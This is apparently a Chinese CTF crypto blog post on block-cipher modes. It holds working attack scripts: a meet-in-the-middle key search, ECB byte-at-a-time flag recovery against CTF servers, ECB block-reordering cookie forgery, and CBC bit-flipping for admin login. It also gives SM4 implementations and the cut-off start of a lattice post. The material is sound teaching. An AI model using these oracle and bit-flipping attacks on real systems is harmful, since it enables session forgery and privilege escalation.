打印加密用的salt,key,iv 解密： openssl aes-128-cbc -d -in encrypt.txt -out encrypt_decrypt.txt -S E0DEB1EAFE7F0000 -iv F1230000000000000000000000000000 -K 12230000000000000000000000000000 openssl enc -d -aes256 -in fl@g.txt -out 1.txt -S: salt ​ 常见攻击ECB模式最简单的加密模式即为电子密码本（Electronic codebook，ECB）模式。需要加密的消息按照块密码的块大小被分为数个块，并对每个块进行独立加密。 中间人攻击（MITM）假如存在一个攻击者，当他作为中间人截获两方的通信时，他能够改变密文的分组顺序，当接收者对密文进行解密时，由于密文分组的顺序被改变了，因此相应的明文分组的顺序也被改变了，那么接收者实际上是解密出了一段被篡改后的密文。在这种场景中，攻击者不需要破译密码，也不需要知道分组密码的算法，他只需要知道哪个分组记录了什么样的数据。 参考：Boston Key Party CTF 2013 - MITM 123456789101112131415161718192021222324252627282930#python2from Crypto.Cipher import AESfrom binascii import hexlify,unhexlifyfrom string import printablealph = printablem = &#x27;&#x27;c = &#x27;&#x27;flag_c = &#x27;&#x27;middle = dict();for x in alph: for y in alph: for z in alph: key1 = &#x27;%s%s%s%s&#x27; % (&#x27;0&#x27; * 13, x, y, z) cipher = AES.new(key1) middle.update(&#123;cipher.encrypt(m): key1&#125;)print &quot;\\nTable built...\\n&quot;;for x in alph: for y in alph: for z in alph: key2 = &#x27;%s%s%s%s&#x27; % (x, y, z, &#x27;0&#x27; * 13) cipher = AES.new(key2) d = cipher.decrypt(c) if d in middle: print &quot;\\nKeys found: %s; %s\\nFlag:&quot; % (middle[d].encode(&#x27;hex&#x27;), key2.encode(&#x27;hex&#x27;)) cipher1 = AES.new(middle[d]) print cipher1.decrypt(cipher.decrypt(flag_c)) 模式攻击动态填充加密+枚举secret字符 方法一 1.明文由输入值m+flag+padding组成，$m$ 为空时， $c$ 可分 $k$ 块，不断调整 $m$ 的长度，直到 $m$ 长度为 $l+1$ 时 $c$ 可分 $k+1$ 块，那么说明 $m$ 长度为 $l$ 时 $c$ 刚好可分 $k$ 块，即无padding情况下，$m+flag$ 可分 $k$ 块，则flag长度即为 $8k-l$。 2.利用上面的思想，在 $m$ 长度为 $l$ 的基础上，长度不断加1，则可以把flag从后开始的每一位推到下一个块中，得到下一个块的密文 $c_i$； 3.又已爆破出的flag位+padding已知，则下一个块的构成为未知字符1位+已爆破出的flag位(+padding)； 4.根据DES-ECB的性质，相同明文块对应的密文块相同。爆破第一位未知字符，将上面的块构成作为输入值输入，得到对应的密文的第一块，分别与实际密文 $c_i$ 比较，匹配的即为正确的明文字符。 5.以此类推，得到完整flag。 参考： ECB模式攻击 1024杯 - 密码系统 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *import gmpy2import stringhost = &#x27;das.wetolink.com&#x27;port = 42887block = 16secret_len = 38ori_padding_len = 10dic = &#x27;&#123;&#125;-&#x27;+string.ascii_lowercase+string.digitsp = connect(host,port)flag = &#x27;&#x27;def pad(leng): pad_len = block - (leng % block) if leng % block != 0 else 0 return chr(pad_len) * pad_lenpadding = [pad(k) for k in range(16)]padding = padding[1:]+[padding[0]]for i in range(secret_len): find=0 payload = (&#x27;*&#x27;*(ori_padding_len+i+1)).encode(&#x27;hex&#x27;) group = i//block p.recvuntil(&#x27;Amazing function: &#x27;) p.sendline(payload) data = p.recvline().strip() print([data[i:i+32] for i in range(0,len(data),32)]) print(data) if group == 0: prob=data[-32:] else: prob=(data[-32*(group+1):-32*(group+1)+32]) print(str(i+1)+&#x27; prob = &#x27;+str(prob)) for j in dic: p.recvuntil(&#x27;Amazing function: &#x27;) flag_suffix = flag[:min(len(flag),15)] payload = (j + flag_suffix + padding[min(len(flag_suffix),15)]).encode(&#x27;hex&#x27;) p.sendline(payload) data = p.recvline().strip() if data[:32]==prob: flag = j + flag print(str(i+1)+&#x27; flag = &#x27;+flag) print() find=1 break if find == 0: print(str(i+1)+&#x27; cannot find!&#x27;) break 方法二 1.由于是ECB的模式，所以当我们输入十五个’0’后，服务会将十五个’0’+flag加密，而此时第一组就是十五个’0’和flag的第一个字符。即，返回的明文的第一组是’0’*15 + flag[0]的密文。 2.我们遍历0-255，发送’0’*15+chr(i)，看返回的密文是不是和最初获得的密文的第一组一致，如果一致，那么此时的chr(i)就是flag的第一位。 3.有了第一位我们就可以发送’0’*14+flag[0]过去，此时返回的第一组密文就是’0’*14+flag[0]+flag[1]的密文了，我们继续用第2步的方法就可以恢复flag[1]了。 4.如此循环往复，逐位爆破flag。 12345678910111213141516171819202122def exp(): sh = remote(&quot;0.0.0.0&quot;,&quot;9999&quot;) pre=&quot;0&quot;*47 flag=&quot;&quot; for block in range(41): #发送填充，泄露一位flag，并获取密文 sh.recvuntil(&quot;Amazing function: &quot;) sh.sendline(pre.encode(&#x27;hex&#x27;)) target = sh.recvuntil(&quot;\\n&quot;)[:-1][64:96] for i in range(256): #遍历字符，找到与获取密文一致时的情况时，即得到一位明文 tmp = &#x27;0&#x27;*(47-block)+flag+chr(i) sh.recvuntil(&quot;Amazing function: &quot;) sh.sendline(tmp.encode(&#x27;hex&#x27;)) now = sh.recvuntil(&quot;\\n&quot;)[:-1] if now[64:96] == target: flag += chr(i) #修改填充 pre = pre[:-1] break return flag[7:-2] 重排攻击在块加密中ECB模式中每个块都是独立加密的。因此攻击者可以在未知密钥的情况下，对密文中的块进行重新排列，组合成合法的可解密的新密文。 考虑这么一种场景，某CMS的cookie格式为DES-ECB加密后的数据，而明文格式如下： 1admin=0;username=pan 由于DES使用的块大小是8字节，因此上述明文可以切分成三个块，其中@为填充符号： 123admin=0;username=pan@@@@ 假设我们可以控制自己的用户名（在注册时），那么有什么办法可以在不知道密钥的情况下将自己提取为管理员呢（即admin=1）？首先将用户名设置为pan@@@@admin=1;，此时明文块的内容如下： 1234admin=0;username=pan@@@@admin=1; 我们所需要做的，就是在加密完成后，将服务器返回的cookie使用最后一个块替换第一个块，这样一来就获得了一个具有管理员权限的合法cookie了。 ​ CBC模式IBM发明了密码分组链接（CBC，Cipher-block chaining）模式。在CBC模式中，每个明文块先与前一个密文块进行异或后，再进行加密。在这种方法中，每个密文块都依赖于它前面的所有明文块。同时，为了保证每条消息的唯一性，在第一个块中需要使用初始化向量。 加密： Ciphertext-0 = Encrypt(Plaintext XOR IV) ——只用于第一个组块Ciphertext-N= Encrypt(Plaintext XOR Ciphertext-N-1) ——用于第二及剩下的组块 $\\left\\{\\begin{array} {c} c_1 = \\text{Enc}(m_1 \\oplus \\text{iv}) \\newline c_2 = \\text{Enc}(m_2 \\oplus c_1) \\newline \\vdots \\newline c_i = \\text{Enc}(m_i \\oplus c_{i-1}) \\end{array} \\right.$ 解密： Plaintext-0 = Decrypt(Ciphertext) XOR IV ——只用于第一个组块Plaintext-N= Decrypt(Ciphertext) XOR Ciphertext-N-1 ——用于第二及剩下的组块 $\\left\\{\\begin{array} {c} m_1 = \\text{Dec}(c_1)\\oplus \\text{iv} \\newline m_2 = \\text{Dec}(c_2)\\oplus c_1 \\newline \\vdots \\newline m_i = \\text{Dec}(c_i)\\oplus c_{i-1} \\end{array} \\right.$ CBC字节翻转Plaintext：明文数据 IV：初始向量 Key：分组加密使用的密钥 Ciphertext：密文数据 每组解密时，先进行分组加密算法的解密，然后与前一组的密文进行异或才是最初的明文。 对于第一组则是与IV进行异或。 上一块密文用来产生下一块明文，如果改变上一块密文的一个字节，然后与下一个解密后的组块异或，就可以得到一个不同的明文。 目标：要把Plain2中的某一字节翻转为另一字节。 由于C1来自于Cipher2进行Block Cipher Decryption之后的结果，而且Key未知，就不能直接得知C1的值； 但可通过字节翻转修改上一组密文Cipher1来翻转下一组的明文Plain2，从而可以完全忽视未知的C1值。 由异或运算可以推导：B1 = A1 ^ C1，则也有：C1 = A1 ^ B1 假设修改后的上一组密文为A1&#39;，要翻转的下一组明文为B1&#39;，则有：B1&#39; = A1&#39; ^ C1 如果能够修改Cipher1，那么就能够修改A1的值为A1&#39;，即A1&#39; = A1 ^ B1 ^ B1&#39;。 即： 12345678B = A ^ CB&#x27; = A&#x27; ^ CA&#x27; = A ^ B ^ B&#x27;A=原上一组密文Cipher1B=原下一组明文Plain2B‘=要翻转的下一组明文Plain2&#x27;A&#x27;=要修改的上一组密文Cipher1&#x27; 要求：1. 对于A1完全可控；2. 已知B1的值。 由于修改了A1，Cipher1在进行Block Cipher Decryption的时候会得出错误的结果，再与IV异或会导致Plain1出错； 如果能够得到修改A1之后产生的错误的Plain1的值，而且IV可以完全控制的话，那么就能够再套用一次前面的方法。 即： 12345678B = A ^ CB&#x27; = A&#x27; ^ CA&#x27; = A ^ B ^ B&#x27;A=原IV值ivB=错误的明文Plain1B‘=要翻转的明文Plain1&#x27;A&#x27;=要修改的IV值iv&#x27; 参考：SYPUCTF2020 - Yusa的密码学课堂—CBC第一课 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *import binasciiimport timep = remote(&#x27;das.wetolink.com&#x27;,42888) # 连接p.recvline()p.recvline()p.recvline()p.recvline()p.sendline(&#x27;1&#x27;) # 注册p.recv()p.sendline(&#x27;Admin&#x27;) # 用户名为Admin，方便之后修改data0 = p.recvline().decode()data0 = data0[28:124] # 提取返回数据部分iv0 = data0[:32] #返回的IVcipher00 = data0[32:64] #&#x27;yusayusayusayusa&#x27;的加密结果cipher01 = data0[64:96] #&#x27;Admin&#x27;的加密结果replacement0 = str(hex(int(cipher00[:2],16)^ord(&#x27;A&#x27;)^ord(&#x27;a&#x27;)))[2:] # 计算替换密文的值payload0 = iv0+replacement0+cipher00[2:]+cipher01 # 发送替换密文print(&#x27;data0: &#x27;,data0)print(&#x27;payload0: &#x27;,payload0)p.recvline()p.recvline()p.recvline()p.recvline()p.sendline(&#x27;2&#x27;) # 登入p.recv()p.sendline(payload0) # 发送Payload0data1 = p.recvline()[:64+len(&#x27;Admin&#x27;)*2] # 得到返回的数据data1 = data1.decode()plain1 = data1[32:64] # &#x27;yusayusayusayusa&#x27;由于密文被替换，解出来的明文是错误的，之后可以进行异或修改print(&#x27;data1: &#x27;,data1)print(&#x27;plain1: &#x27;,plain1)iv1 = str(hex(int(binascii.hexlify(&#x27;yusa&#x27;.encode()).decode()*4,16)^int(plain1,16)^int(iv0,16)))[2:] # 计算IV，用于修改错误的明文print(&#x27;iv1: &#x27;,iv1)payload1 = iv1+replacement0+cipher00[2:]+cipher01print(&#x27;payload1: &#x27;,payload1)p.recvline()p.recvline()p.recvline()p.recvline()p.sendline(&#x27;2&#x27;) # 登入p.recv()p.sendline(payload1) # 发送Payload1p.recvline()p.recvline()print(p.recvline()) # 得到flag CBC字节翻转（Web）参考：bugkuctf–login4字节翻转攻击 123456789101112131415161718//原密文修改字符&lt;?php$enc=base64_decode(&quot;bIpgPK29vVQosJ+smzh0pOdq7QrP3H9CN0MBfynL1eKtILs/ayew1snTYbeYSIz8rQctkAUMORS76SWQHXwuKg==&quot;);$enc[13] = chr(ord($enc[13]) ^ ord(&quot;k&quot;) ^ ord (&quot;n&quot;));echo base64_encode($enc);?&gt; //新密文，修改对应iv值保证首块解密无错&lt;?php$enc=base64_decode(&quot;4quudO++PAeVPQfcFJ0bbm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==&quot;); $iv=base64_decode(&quot;TrphJjWLH37sj6+EBqh28A==&quot;);$cleartext = &#x27;a:2:&#123;s:8:&quot;userna&#x27;;$newiv = &#x27;&#x27;;for ($i=0;$i&lt;16;$i++)&#123; $newiv=$newiv.chr(ord($iv[$i]) ^ ord($enc[$i]) ^ ord ($cleartext[$i]));&#125;echo base64_encode($newiv);?&gt; Padding Oracle AttackBP插件：PaddingOracleHunter ​ SM4SM4是一种分组密码算法，其分组长度为128位（即16字节，4字），密钥长度也为128位（即16字节，4字）。其加解密过程采用了32轮迭代机制（与DES、AES类似），每一轮需要一个轮密钥（与DES、AES类似）。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485# Pythonclass SM4Cipher: def __init__(self, key: bytes): if not len(key) == 16: raise ValueError(&quot;SM4 key must be length of 16. &quot;) self._key_r = self._generate_key(key) self.block_size = 16 def encrypt(self, plaintext: bytes): return self._do(plaintext, self._key_r) def decrypt(self, ciphertext: bytes): return self._do(ciphertext, self._key_r[::-1]) def _do(self, text: bytes, key_r: list): text_ = [0 for _ in range(4)] # 将 128bit 转化成 4x32bit for i in range(4): text_[i] = int.from_bytes(text[4 * i:4 * i + 4], &#x27;big&#x27;) for i in range(32): box_in = text_[1] ^ text_[2] ^ text_[3] ^ key_r[i] box_out = self._s_box(box_in) temp = text_[0] ^ box_out ^ self._rot_left(box_out, 2) ^ self._rot_left(box_out, 10) temp = temp ^ self._rot_left(box_out, 18) ^ self._rot_left(box_out, 24) text_ = text_[1:] + [temp] text_ = text_[::-1] # 结果逆序 # 将 4x32bit 合并成 128bit result = bytearray() for i in range(4): result.extend(text_[i].to_bytes(4, &#x27;big&#x27;)) return bytes(result) def _generate_key(self, key: bytes): &quot;&quot;&quot;密钥生成&quot;&quot;&quot; key_r, key_temp = [0 for _ in range(32)], [0 for _ in range(4)] FK = [0xa3b1bac6, 0x56aa3350, 0x677d9197, 0xb27022dc] CK = [0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279] # 将 128bit 拆分成 4x32bit for i in range(4): temp = int.from_bytes(key[4 * i:4 * i + 4], &#x27;big&#x27;) key_temp[i] = temp ^ FK[i] # 循环生成轮密钥 for i in range(32): box_in = key_temp[1] ^ key_temp[2] ^ key_temp[3] ^ CK[i] box_out = self._s_box(box_in) key_r[i] = key_temp[0] ^ box_out ^ self._rot_left(box_out, 13) ^ self._rot_left(box_out, 23) key_temp = key_temp[1:] + [key_r[i]] return key_r @staticmethod def _s_box(n: int): BOX = [0xD6, 0x90, 0xE9, 0xFE, 0xCC, 0xE1, 0x3D, 0xB7, 0x16, 0xB6, 0x14, 0xC2, 0x28, 0xFB, 0x2C, 0x05, 0x2B, 0x67, 0x9A, 0x76, 0x2A, 0xBE, 0x04, 0xC3, 0xAA, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99, 0x9C, 0x42, 0x50, 0xF4, 0x91, 0xEF, 0x98, 0x7A, 0x33, 0x54, 0x0B, 0x43, 0xED, 0xCF, 0xAC, 0x62, 0xE4, 0xB3, 0x1C, 0xA9, 0xC9, 0x08, 0xE8, 0x95, 0x80, 0xDF, 0x94, 0xFA, 0x75, 0x8F, 0x3F, 0xA6, 0x47, 0x07, 0xA7, 0xFC, 0xF3, 0x73, 0x17, 0xBA, 0x83, 0x59, 0x3C, 0x19, 0xE6, 0x85, 0x4F, 0xA8, 0x68, 0x6B, 0x81, 0xB2, 0x71, 0x64, 0xDA, 0x8B, 0xF8, 0xEB, 0x0F, 0x4B, 0x70, 0x56, 0x9D, 0x35, 0x1E, 0x24, 0x0E, 0x5E, 0x63, 0x58, 0xD1, 0xA2, 0x25, 0x22, 0x7C, 0x3B, 0x01, 0x21, 0x78, 0x87, 0xD4, 0x00, 0x46, 0x57, 0x9F, 0xD3, 0x27, 0x52, 0x4C, 0x36, 0x02, 0xE7, 0xA0, 0xC4, 0xC8, 0x9E, 0xEA, 0xBF, 0x8A, 0xD2, 0x40, 0xC7, 0x38, 0xB5, 0xA3, 0xF7, 0xF2, 0xCE, 0xF9, 0x61, 0x15, 0xA1, 0xE0, 0xAE, 0x5D, 0xA4, 0x9B, 0x34, 0x1A, 0x55, 0xAD, 0x93, 0x32, 0x30, 0xF5, 0x8C, 0xB1, 0xE3, 0x1D, 0xF6, 0xE2, 0x2E, 0x82, 0x66, 0xCA, 0x60, 0xC0, 0x29, 0x23, 0xAB, 0x0D, 0x53, 0x4E, 0x6F, 0xD5, 0xDB, 0x37, 0x45, 0xDE, 0xFD, 0x8E, 0x2F, 0x03, 0xFF, 0x6A, 0x72, 0x6D, 0x6C, 0x5B, 0x51, 0x8D, 0x1B, 0xAF, 0x92, 0xBB, 0xDD, 0xBC, 0x7F, 0x11, 0xD9, 0x5C, 0x41, 0x1F, 0x10, 0x5A, 0xD8, 0x0A, 0xC1, 0x31, 0x88, 0xA5, 0xCD, 0x7B, 0xBD, 0x2D, 0x74, 0xD0, 0x12, 0xB8, 0xE5, 0xB4, 0xB0, 0x89, 0x69, 0x97, 0x4A, 0x0C, 0x96, 0x77, 0x7E, 0x65, 0xB9, 0xF1, 0x09, 0xC5, 0x6E, 0xC6, 0x84, 0x18, 0xF0, 0x7D, 0xEC, 0x3A, 0xDC, 0x4D, 0x20, 0x79, 0xEE, 0x5F, 0x3E, 0xD7, 0xCB, 0x39, 0x48] result = bytearray() # 将 32bit 拆分成 4x8bit，依次进行S盒变换 for item in list(n.to_bytes(4, &#x27;big&#x27;)): result.append(BOX[item]) return int.from_bytes(result, &#x27;big&#x27;) @staticmethod def _rot_left(n, m): &quot;&quot;&quot;循环左移&quot;&quot;&quot; return ((n &lt;&lt; m) | (n &gt;&gt; (32 - m))) &amp; 0xFFFFFFFF key = bytes.fromhex(&quot;0123456789ABCDEFFEDCBA9876543210&quot;) # 128bit密钥plaintext = bytes.fromhex(&quot;00112233445566778899aabbccddeeff&quot;) # 128bit明文sm4 = SM4Cipher(key)print(sm4.encrypt(plaintext).hex()) # 09325c4853832dcb9337a5984f671b9a 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164// C#include &lt;stdio.h&gt;#include &lt;iostream&gt;#include&lt;bits/stdc++.h&gt;#include &lt;string.h&gt;/************************************固定参数****************************************/ //S盒const unsigned char Sbox[256] = &#123; 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16&#125;;//CK为固定参数，用于密钥扩展算法 const unsigned int CK[32] = &#123; 0x00070e15, 0x1c232a31, 0x383f464d, 0x545b6269, 0x70777e85, 0x8c939aa1, 0xa8afb6bd, 0xc4cbd2d9, 0xe0e7eef5, 0xfc030a11, 0x181f262d, 0x343b4249, 0x50575e65, 0x6c737a81, 0x888f969d, 0xa4abb2b9, 0xc0c7ced5, 0xdce3eaf1, 0xf8ff060d, 0x141b2229, 0x30373e45, 0x4c535a61, 0x686f767d, 0x848b9299, 0xa0a7aeb5, 0xbcc3cad1, 0xd8dfe6ed, 0xf4fb0209, 0x10171e25, 0x2c333a41, 0x484f565d, 0x646b7279 &#125;;//系统参数FK，密钥扩展算法中会使用到 const unsigned int FK[4]=&#123;0xA3B1BAC6, 0x56AA3350, 0x677D9197, 0xB27022DC&#125;; /************************************全局变量****************************************/ unsigned int rk[32];//子密钥 unsigned int X[32];//每一轮加密的结果 unsigned int X_0[32];//每一轮解密的结果 unsigned int y[4];//暂时存放32轮后的密文 unsigned int y2[4];//暂时存放32轮后的明文 /***********************************测试用例*****************************************/ unsigned int key[4]=&#123;0x01234567,0x89abcdef,0xfedcba98,0x76543210&#125;;// //unsigned int message[4]=&#123;0x01234567,0x89abcdef,0xfedcba98,0x76543210&#125;;//unsigned int message[16]=&#123;0xFF, 0xD8, 0xFF, 0xE0, 0x00, 0x10, 0x4A, 0x46, 0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01&#125;;/* *利用S盒非线性置换 *传进来的A（32位）取高位的8位（大端机真实的低位在高位储存）与0xFF做与运算，*经过Sbox置换后放置低位的8位中，再与其他置换出的数做或运算得到t *截断用 &gt;&gt;（位数） &amp; 0xff，而拼接用 | */ unsigned int T(unsigned int A)&#123; unsigned int t; t = Sbox[(A)&gt;&gt;24&amp;0xFF]&lt;&lt;24|Sbox[(A)&gt;&gt;16&amp;0xFF]&lt;&lt;16|Sbox[(A)&gt;&gt;8&amp;0xFF]&lt;&lt;8|Sbox[(A)&amp;0xFF]; return t;&#125; /**循环右移*x为数，y为右移的位数 */ unsigned int Rotl(unsigned int x, unsigned int y)&#123; unsigned int t = ((x)&gt;&gt;(y)|(x)&lt;&lt;(32-(y))); return t;&#125;/**线性转换L1*在轮函数中用到 */ unsigned int L1(unsigned int t)&#123; t = (t)^Rotl(t,2)^Rotl(t,10)^Rotl(t,18)^Rotl(t,24); return t;&#125; /**线性转换L2*在子密钥扩展中用到 */ unsigned int L2(unsigned int t)&#123; t = (t)^Rotl(t,12)^Rotl(t,22); return t;&#125; /**sms4加密算法 */void encrypt(unsigned int x[], unsigned int rk[32], int num)&#123; for(int i=0; i&lt;32; i+=4)&#123; x[0+num] = x[0+num]^L1(T(x[1+num]^x[2+num]^x[3+num]^rk[i+0])); x[1+num] = x[1+num]^L1(T(x[2+num]^x[3+num]^x[0+num]^rk[i+1])); x[2+num] = x[2+num]^L1(T(x[3+num]^x[0+num]^x[1+num]^rk[i+2])); x[3+num] = x[3+num]^L1(T(x[0+num]^x[1+num]^x[2+num]^rk[i+3])); X[i+0] = x[0+num]; X[i+1] = x[1+num]; X[i+2] = x[2+num]; X[i+3] = x[3+num]; &#125; y[0] = X[31]; y[1] = X[30]; y[2] = X[29]; y[3] = X[28];&#125;/**sms4解密算法 */void decrypt(unsigned int x[], unsigned int rk[32], int num)&#123; for(int i=0; i&lt;32; i+=4)&#123; x[0] = x[0]^L1(T(x[1]^x[2]^x[3]^rk[31-i])); x[1] = x[1]^L1(T(x[2]^x[3]^x[0]^rk[30-i])); x[2] = x[2]^L1(T(x[3]^x[0]^x[1]^rk[29-i])); x[3] = x[3]^L1(T(x[0]^x[1]^x[2]^rk[28-i])); X_0[i+0] = x[0]; X_0[i+1] = x[1]; X_0[i+2] = x[2]; X_0[i+3] = x[3]; &#125; y2[0] = X_0[31]; y2[1] = X_0[30]; y2[2] = X_0[29]; y2[3] = X_0[28];&#125;/**密钥扩展算法*/ void keyExt(unsigned int key[4])&#123; unsigned int K[4]; K[0] = key[0]^FK[0]; K[1] = key[1]^FK[1]; K[2] = key[2]^FK[2]; K[3] = key[3]^FK[3]; for(int i=0; i&lt;32; i+=4)&#123; K[0] = K[0]^L2(T(K[1]^K[2]^K[3]^CK[i+0])); K[1] = K[1]^L2(T(K[2]^K[3]^K[0]^CK[i+1])); K[2] = K[2]^L2(T(K[3]^K[0]^K[1]^CK[i+2])); K[3] = K[3]^L2(T(K[0]^K[1]^K[2]^CK[i+3])); rk[i+0] = K[0]; rk[i+1] = K[1]; rk[i+2] = K[2]; rk[i+3] = K[3]; &#125;&#125;int main()&#123; unsigned int cipher[4]; unsigned int *message_0; //生成子密钥 keyExt(key); //开始解密 FILE *p = fopen(&quot;./cipher.txt&quot;, &quot;r+&quot;); FILE *p2 = fopen(&quot;./decrypted_message.txt&quot;, &quot;wb&quot;); printf(&quot;\\n明文为：\\n&quot;); for(int j=0;j&lt;494868;j+=4)&#123; for(int i=0;i&lt;4;i++) fscanf(p,&quot;%08x&quot;, &amp;cipher[i]); decrypt(cipher,rk,j); message_0 = y2; for(int i=0;i&lt;4;i++)&#123; printf(&quot;%08x &quot;, message_0[i]); fprintf(p2,&quot;%08x &quot;, message_0[i]); &#125; printf(&quot;\\n&quot;); fprintf(p2,&quot;\\n&quot;); &#125; fclose(p); fclose(p2);&#125;","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"块密码","slug":"块密码","permalink":"https://lazzzaro.github.io/tags/%E5%9D%97%E5%AF%86%E7%A0%81/"},{"name":"AES","slug":"AES","permalink":"https://lazzzaro.github.io/tags/AES/"},{"name":"DES","slug":"DES","permalink":"https://lazzzaro.github.io/tags/DES/"}],"author":"Lazzaro"},{"title":"格密码","slug":"crypto-格密码","date":"2020-11-07T03:53:05.000Z","updated":"2022-12-15T17:45:34.366Z","comments":true,"path":"2020/11/07/crypto-格密码/","link":"","permalink":"https://lazzzaro.github.io/2020/11/07/crypto-%E6%A0%BC%E5%AF%86%E7%A0%81/","excerpt":"","text":"​ 格密码线性独立空间上有集合 $v_1,\\cdots,v_n \\in \\mathbb{R}^n$，格（Lattices）就是这些向量的线性组合，用公式表示为： $L=\\{a_1v_1+a_2v_2+\\cdots+a_nv_n \\mid a_1,a_2,\\cdots,a_n \\in \\mathbb{Z}\\}$。 格 $L$ 的维数等于格中向量的个数。 假定 $v_1,v_2,\\cdots,v_n$ 是格 $L$ 的基，$w_1,w_2,\\cdots,w_n \\in L$，则必然存在整系数 $a_{ij}$ 使得： $\\begin{cases} w_1=a_{11}v_1+a_{12}v_2+\\cdots+a_{1n}v_n \\\\ w_2=a_{21}v_1+a_{22}v_2+\\cdots+a_{2n}v_n \\\\ \\vdots \\\\ w_n=a_{n1}v_1+a_{n2}v_2+\\cdots+a_{nn}v_n \\end{cases}$ 这样，格的问题就是矩阵运算了。 最短向量问题（SVP，The Shortest Vector Problem）： 寻找一个格 $L$ 中最短的非零向量。即，寻找一个 $v \\in L$ 满足其欧几里德范数 $\\mid\\mid v \\mid\\mid$ 最小。 最接近向量问题（CVP，The Closest Vector Problem）： 对于一个非格 $L$ 中的向量 $w$，在格中寻找一个向量 $v$，使得 $\\mid\\mid w-v \\mid\\mid$ 最小。 CVP和SVP都是NP完备问题，因此求解起来十分困难，因此这两个问题都是可以作为密钥体制的基础的。 构造示例 $bm-kn-c=-r \\Longrightarrow \\begin{bmatrix} m &amp; -1 &amp; -k \\end{bmatrix}\\begin{bmatrix} 1 &amp; 0 &amp; b \\newline 0 &amp; 2^{400} &amp; c \\newline 0 &amp; 0 &amp; n \\end{bmatrix}=\\begin{bmatrix} m &amp; -2^{400} &amp; -r \\end{bmatrix}$ ​ NRTU格密码NTRU是一个带有专利保护的开源公开密钥加密系统，使用基于格的加密算法来加密数据。它包括两部分算法：NTRUEncrypt用来加密，NTRUSign用来进行数字签名。与其他流行的公钥加密系统不同，它可以防止被Shor算法破解，并显著提升了性能。 在同等加密强度下，NTRU执行大开销的私钥操作比RSA算法快得多。RSA算法的私钥操作耗时与密钥长度呈三次方关系，而NTRU相应操作为二次方关系。 NTRU密码体制，需要三个整数参数 $(N,p,q)$ 和四个次数为 $N-1$ 的整系数多项式集合 $L_f,L_g,L_{\\varphi},L_m$，在这里 $N$ 为一素数，$p,q$ 可以不必为素数，但为安全，要求 $\\gcd(p,q)=1$，且 $q$ 远大于 $p$。 NTRU工作于多项式整数环 $\\mathbb{R}=\\mathbb{Z}[x]/(x^N-1)$，当 $F \\in \\mathbb{R}$，可以把 $F$ 